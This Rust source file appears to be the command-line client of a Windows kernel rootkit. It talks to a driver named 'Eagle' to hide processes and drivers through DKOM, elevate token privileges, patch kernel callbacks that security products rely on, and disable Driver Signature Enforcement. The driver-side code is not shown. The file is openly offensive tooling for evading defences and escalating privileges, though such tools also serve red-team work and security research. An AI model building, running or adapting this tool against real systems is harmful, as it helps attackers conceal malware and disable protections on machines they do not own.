use sysinfo::{Pid, SystemExt, ProcessExt};
use winapi::um::{fileapi::{CreateFileA, OPEN_EXISTING}, winnt::{GENERIC_READ, GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE}, handleapi::CloseHandle};
use std::{ffi::CString, ptr::null_mut};
mod kernel_interface;
use clap::{Args, Parser, Subcommand, ArgGroup};

#[derive(Parser)]
#[clap(author, version, about, long_about = None)]
struct Cli {
    #[clap(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
   Process(Process),
   Callbacks(Callbacks),
   DSE(DSE),
   Driver(Driver),
}

#[derive(Args)]
#[clap(group(
    ArgGroup::new("process")
        .required(true)
        .args(&["protect", "unprotect", "elevate", "hide"]),
))]
struct Process {
    /// Target process name
    #[clap(long, short, value_name = "PROCESS")]
    name: String,

    /// Protect a process
    #[clap(long, short)]
    protect: bool,

    /// Unprotect a process
    #[clap(long, short)]
    unprotect: bool,

    /// Elevate all token privileges
    #[clap(long, short)]
    elevate: bool,

    /// Hide a process using Direct Kernel Object Manipulation (DKOM)
    #[clap(long)]
    hide: bool,
}

#[derive(Args)]
#[clap(group(
    ArgGroup::new("callbacks")
        .required(true)
        .args(&["enumerate", "patch"]),
))]
struct Callbacks {
    /// Enumerate kernel callbacks
    #[clap(long, short)]
    enumerate: bool,

    /// Patch kernel callbacks 0-63
    #[clap(long, short)]
    patch: Option<u32>,
}

#[derive(Args)]
#[clap(group(
    ArgGroup::new("dse")
        .required(true)
        .args(&["enable", "disable"]),
))]
struct DSE {
    /// Enable Driver Signature Enforcement (DSE)
    #[clap(long, short)]
    enable: bool,

    /// Disable Driver Signature Enforcement (DSE)
    #[clap(long, short)]
    disable: bool,
}

#[derive(Args)]
#[clap(group(
    ArgGroup::new("driver")
        .required(true)
        .args(&["hide", "enumerate"]),
))]
struct Driver {
    /// Hide a driver using Direct Kernel Object Manipulation (DKOM)
    #[clap(long)]
    hide: bool,

    /// Enumerate loaded kernel modules
    #[clap(long, short)]
    enumerate: bool,
}

fn main() {

    let cli = Cli::parse();

    let file = CString::new("\\\\.\\Eagle").unwrap().into_raw() as *const i8;
    let driver_handle = unsafe { 
        CreateFileA(
        file,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        null_mut(),
        OPEN_EXISTING,
        0,
        null_mut())
    };

    if driver_handle.is_null() {
        panic!("[-] Failed to get a handle to the driver");
    }

    match &cli.command {
        Commands::Process(p) => {
            let process_id = get_process_id_by_name(p.name.as_str()) as u32;
            
            if p.protect {
                kernel_interface::protect_process(process_id, driver_handle);
            } else if p.unprotect {
                kernel_interface::unprotect_process(process_id, driver_handle);
            } else if p.elevate {
                kernel_interface::enable_tokens(process_id, driver_handle);
            } else if p.hide {
                kernel_interface::hide_process(process_id, driver_handle);
            } else {
                println!("[-] Invalid arguments");
            }
        }
        Commands::Callbacks(c) => {
            if c.enumerate {
                kernel_interface::enumerate_callbacks(driver_handle);
            } else if c.patch.unwrap() > 0 && c.patch.unwrap() < 64 {
                kernel_interface::patch_callback(c.patch.unwrap(), driver_handle);
            } else {
                println!("[-] Invalid arguments");
            }
        }
        Commands::DSE(d) => {
            if d.enable {
                kernel_interface::enable_or_disable_dse(driver_handle, true);
            } else if d.disable {
                kernel_interface::enable_or_disable_dse(driver_handle, false);
            } else {
                println!("[-] Invalid arguments");
            }
        }
        Commands::Driver(d) => {
            if d.hide {
                kernel_interface::hide_driver(driver_handle);
            } else if d.enumerate {
                kernel_interface::get_loaded_modules_list(driver_handle);
            } else {
                println!("[-] Invalid arguments");
            }
        }
    }

    unsafe { CloseHandle(driver_handle) };
}

/// Get process ID by name
fn get_process_id_by_name(target_process: &str) -> Pid {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }

    return process_id;
}